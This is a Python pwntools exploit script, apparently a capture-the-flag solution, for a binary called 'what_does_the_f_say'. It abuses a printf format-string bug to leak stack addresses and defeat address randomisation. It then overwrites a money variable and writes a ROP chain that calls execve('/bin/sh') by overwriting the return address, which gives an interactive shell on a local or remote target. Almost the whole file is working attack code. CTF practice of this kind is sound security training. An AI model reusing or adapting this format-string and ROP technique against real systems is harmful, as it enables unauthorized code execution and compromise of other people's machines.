#!/usr/bin/env python3

from pwn import *

DEBUG = False

def Main(ip=None, port=None):
    context.binary = "./what_does_the_f_say"

    if ip == None:
        local = True
    else:
        local = False

    if local:
        proc = process()
        # ~ GDB(proc)

    else:
        proc = remote(ip, int(port))

    proc.readuntil("2. Space food")
    input("ready to attach if needed; press enter to start")

    MoreMoney(proc)

    # ~ DumpStack(proc, 50)
    ### 25 __libc_start_main_ret

    Exploit(proc, local)

    proc.interactive()


def Exploit(proc, local):
    ### rsp at drinks_menu() ret
    rsp = ReadStackOffset(proc, 1) + 0x38

    prog_base = ReadStackOffset(proc, 15) - 0x174a
    pop_rdi = prog_base + 0x18bb
    pop_rsi_r15 = prog_base + 0X18b9
    pop3 = prog_base + 0x18b6

    libc_start_main_ret = ReadStackOffset(proc, 25)
    print("__libc_start_main_ret:", hex(libc_start_main_ret))

    if local:
        raise Exception("local libc offsets not defined")
    else:
        ### put remote offsets here
        libc_execve = libc_start_main_ret + 0xc32f9
        libc_bin_sh  = libc_start_main_ret + 0x192563

    print("Writing pop rdi ptr:", hex(pop_rdi))
    WriteMem(proc, rsp + 4*8, pop_rdi)

    print("Writing bin_sh ptr for rdi:", hex(libc_bin_sh))
    WriteMem(proc, rsp + 5*8, libc_bin_sh)

    print("Writing pop_rsi ptr:", hex(pop_rsi_r15))
    WriteMem(proc, rsp + 6*8, pop_rsi_r15)

    print("Writing rsi to be popped")
    WriteMem(proc, rsp + 7*8, 0)

    ### skip rsp + 8 because pop_rsi gadget also pops r15
    WriteMem(proc, rsp + 8*8, 0x4206900)

    print("Writing execve ptr:", hex(libc_execve))
    WriteMem(proc, rsp + 9*8, libc_execve)

    ## only get 1 loop to overwrite
    print("Writing pop3 ptr", hex(pop3))
    ### overwrite ret last 2 to exec exploit
    overwrite = "%{}p%10$hn".format( pop3 & 0xffff)
    overwrite += "\x00" * ( 16 - len(overwrite) )
    overwrite = overwrite.encode('latin-1')
    overwrite += p64(rsp)
    ExploitWriteSequence(proc, overwrite, False)


def WriteMem(proc, addr, data):
    ### have to mask it off and write 2 bytes at a time because
    ### printf isn't gonna write GBs of whitespace at once, plus that would take forever

    for i, mask in enumerate([0xffff, 0xffff0000, 0xffff00000000, 0xffff000000000000]):
        n = data & mask
        n = n >> i*16

        ### will fail in case of ~16 > x > 0
        if n == 0:
            overwrite = "%10$hn".format(n)
        else:
            overwrite = "%{}p%10$hn".format(n)

        overwrite += "\x00" * ( 16 - len(overwrite) )
        overwrite = overwrite.encode('latin-1')
        overwrite += p64(addr + i*2)

        ExploitWriteSequence(proc, overwrite)


def ReadStackOffset(proc, offset):
    exploit = "XXX%{}$p".format(offset)

    out = ExploitWriteSequence(proc, exploit).splitlines()

    for line in out:
        if line.startswith(b'XXX'):
            mem = line.strip(b'XXX')

            if mem == b'(nil)':
                return 0

            else:
                return int(mem, 16)

    raise Exception("Couldnt find mem output:", out)


def DumpStack(proc, length):
    for offset in list(range(1, length)):
        print( offset, hex(ReadStackOffset(proc, offset)) )


def MoreMoney(proc):
    print("Overwriting money")

    ### 15 is fox_bar+106
    money = ReadStackOffset(proc, 15) + 0x28c9

    if DEBUG:
        print("money addr:", hex(money))

    overwrite = b"%85p%10$hhn"
    overwrite += b"\x00" * ( 16 - len(overwrite) )
    overwrite += p64(money)

    ExploitWriteSequence(proc, overwrite)


def ExploitWriteSequence(proc, data, read_output=True):
    proc.clean()

    proc.writeline("1")

    if DEBUG:
        print("INPUT: 1")
        print("OUTPUT:", proc.read())

    proc.writeline("2")

    if DEBUG:
        print("INPUT: 2")
        print("OUTPUT:", proc.read())

    proc.clean()

    proc.writeline(data)

    if DEBUG:
        print("INPUT:", data)

    if read_output:
        output = proc.readuntil("2. Space food")

        if DEBUG:
            print("INPUT:", data)

        return output


def GDB(proc):
    sc = list()
    # ~ sc.append("break *drinks_menu+239")
    sc.append("break *drinks_menu+386")
    sc.append("continue")
    sc.append("")

    sc = '\n'.join(sc)

    gdb.attach(proc, sc)


if __name__ == "__main__":
    argv = sys.argv

    if len(argv) > 2:
        Main(argv[1], argv[2])

    else:
        Main()
